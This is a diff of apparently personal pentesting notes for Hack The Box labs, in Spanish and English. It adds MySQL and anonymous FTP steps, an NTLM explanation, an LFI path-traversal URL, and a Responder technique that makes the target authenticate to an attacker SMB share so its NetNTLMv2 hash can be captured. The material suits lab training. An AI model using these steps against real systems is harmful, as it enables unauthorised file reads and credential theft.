@@ -22,13 +22,24 @@ python -c 'import pty; pty.spawn("/bin/bash")
 
 ### MYSQL
 ```
-
+mysql -h IP -u root
 Dentro de la revershell lanzamos mysql -u user -pPASSWD (sin espacio detras de la p)
 show databases;
 por ejemplo tenemos la databases de joomla ---> use joomla
 show tables;
-select * FROM users(por ejemplo la que encontramos es user) \G
+select * FROM users \G (por ejemplo la que encontramos es user) 
 
+### FTP
+```
+ftp <IP>
+>anonymous
+>anonymous
+>ls -a # List all files (even hidden) (yes, they could be hidden)
+>binary #Set transmission to binary instead of ascii
+>ascii #Set transmission to ascii instead of binary
+>bye #exit
+wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
+Tambien se puede descargar desde dentro de ftp con get filename
 
 ### FFUF
 ```
@@ -138,6 +149,39 @@ bloodhound-python -d jab.htb -c all -u svc_openfire -p '!@#$%^&*(1qazxsw' -ns 10
 
 
 
+### NTLM
+```
+
+NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
+authentication protocol used to authenticate a client to a resource on an Active Directory domain.
+It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
+only once, at login.
+The NTLM authentication process is done in the following way :
+1. The client sends the user name and domain name to the server.
+2. The server generates a random character string, referred to as the challenge.
+3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
+server.
+4. The server retrieves the user password (or equivalent).
+5. The server uses the hash value retrieved from the security account database to encrypt the challenge
+string. The value is then compared to the value received from the client. If the values match, the client
+is authenticated.
+
+###LFI ---> Local File Inclusion
+``` 
+
+Por ejemplo en la maquina responder htb tenemos la pagina http://unika.htb/index.php?page=french.html que puede ser vulnerable a LFI
+si no esta bien configurada
+En un sistema windows vamos a probar si funciona e incluye files en el sistema con la ruta de /system32 que siempre existe
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+Una vez que sabemos que es vulnerable siendo windows podemos seleccionar un protocolo como SMB, windows intentara autenticarse
+en nuestra maquina y nosotros capturaremos el NetNTLMv2 (New Technology Lan Manager) con la herramienta RESPONDER
+
+###RESPONDER ---> (capturar NTLM entre otros)
+```
+
+Lo inicializamos --> sudo responder -I {network_interface} se ve con ifconfig
+Ahora le decimos al server que incluya un recurso de nuestro SMB server con -Z http://unika.htb/?page=//10.10.14.25/somefile
+con la ip de nuestra maquina atacante ( dara un error en la web pero en el responder tendremos  NetNTLMv del administrator)
 
 ### XSS
 ```
